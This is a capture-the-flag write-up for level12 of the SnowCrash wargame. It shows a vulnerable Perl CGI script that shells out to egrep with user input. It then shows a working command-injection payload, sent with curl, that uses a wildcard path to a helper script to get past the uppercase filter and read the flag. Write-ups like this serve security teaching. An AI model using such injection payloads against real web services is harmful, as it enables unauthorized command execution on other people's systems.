# Solution

So once we logged in, we can find in the home a perl script name level12.pl here is the source code:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}
```

So it's a server that is up that accept two param x and y it will uppercase everything inside x param,
and x will be use in egrep.

Egrep is equivalent to grep -E which means that the pattern interpolate the strings so we can use \`\` or $(...) notation,
to pass a command the issue though is that since everything will be in uppercase wee need to create a new getflag command,
so the idea here is to execute a bash script that will do multiple command in one argument since we also cannot do space.

Here is the payload bash script:

```sh
#!/bin/bash

getflag > /tmp/flag
```

Now that we have created this script we need to make that script executable and have a uppercase name.

```sh
chmod +x /tmp/PAYLOAD
```

We will use the leverage of the subshell that will launch from egrep so that it will run the bash script,
now we just need to use $(...) notation to use the subshell ability.


```sh
level12@SnowCrash:~$ curl 'localhost:4646?x=$(/*/PAYLOAD)'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$
```

We use the  $(...) notation but since we cannot specify /tmp/PAYLOAD because it's min so,
we use * to fetch any valid directory with PAYLOAD inside, and as you can see it works we get the flag for level13.
